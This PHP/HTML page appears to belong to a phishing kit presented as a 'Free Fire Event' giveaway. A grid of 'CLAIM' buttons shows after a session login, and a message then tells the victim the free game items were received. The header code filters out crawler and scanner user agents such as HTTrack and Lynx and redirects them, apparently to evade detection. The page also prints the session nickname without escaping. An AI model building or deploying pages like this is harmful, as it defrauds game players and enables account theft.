<?php  
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
session_start();
error_reporting();
if(!$_SESSION['log']) {
	echo "<script>document.location='index.php';</script>";
} else {
	$getNick = $_SESSION['nick'];
	$nick = strtoupper($getNick);
}
?>
<!DOCTYPE html>
<html>
<head>
	<noscript><H1><CENTER>IDHAAM69@CRAZYTYPER.INFO</CENTER></H1></noscript>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <title>FREE FIRE EVENT</title>
    <meta property="og:description" content="Get Free Bundle Garena Free Fire in Here !!">
    <meta property="og:image" content="">
    <link rel="shorcut icon" href="idhmxd/images/icon.png">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/style.css">
    <link rel="stylesheet" type="text/css" href="idhmxd/css/animate.css">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script type="text/javascript" src="idhmxd/js/idhaampedia.js"></script>
</head>
<body>
	<div id="bg"></div>
	<div id="idhaampedia">
		<div class="header">
			<img class="logo" src="idhmxd/images/logo-small.png">
		</div>
		<div class="content">
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/66.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/65.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/64.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/63.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/62.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/61.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/60.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/59.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/58.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/57.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/56.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/55.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/54.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/53.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/52.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/51.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/50.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/49.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/48.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/47.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/46.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/45.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/44.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/43.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/42.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/41.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/40.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/39.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/38.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/37.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/36.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/35.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/34.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/33.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/32.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/31.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/30.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/29.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/28.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/27.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/26.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/25.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/24.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/23.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/024.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/023.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/022.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/021.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/020.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/019.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/018.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/017.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/016.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/015.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/014.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/013.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/012.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/011.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/010.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/09.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/08.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/07.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/06.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/05.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/04.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/03.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/1.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/2.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/3.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/4.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/5.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/6.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/7.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/02.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/01.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/12.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/9.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/10.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/11.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/8.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/13.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/14.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/15.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/16.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/17.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/18.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/19.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/20.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content">
				<img class="img-content" src="idhmxd/images/item/21.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
			<div class="box-content kanan">
				<img class="img-content" src="idhmxd/images/item/22.jpg">
				<button class="btn-content" onclick="pilihan()">CLAIM</button>
			</div>
		</div>
		<div id="login" style="display: block;">
			<div class="animated slideInUp login">
				<div class="txt-login">SELAMAT <?php echo $nick;?><br>ITEM BERHASIL ANDA DAPATKAN</div>
				<hr class="garis-pilihan">
				<button class="btn-pilihan" onclick="location.href='index.php';">Logout</button>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="idhmxd/js/antianti.js"></script>
</body>
</html>